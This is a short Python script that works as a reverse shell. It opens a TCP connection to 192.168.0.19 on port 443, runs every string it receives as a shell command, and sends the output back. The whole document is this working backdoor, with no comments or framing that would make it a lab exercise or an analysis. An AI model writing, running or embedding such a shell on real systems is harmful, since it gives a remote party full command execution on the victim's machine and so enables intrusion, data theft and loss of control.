import socket
import scapy
import os
import sys
import subprocess

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '192.168.0.19'
port = 443
connection.connect((host, port))
while True:
	data = connection.recv(1024)
	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc.stdout.read() + proc.stderr.read()
	connection.send(stdout_value)
	
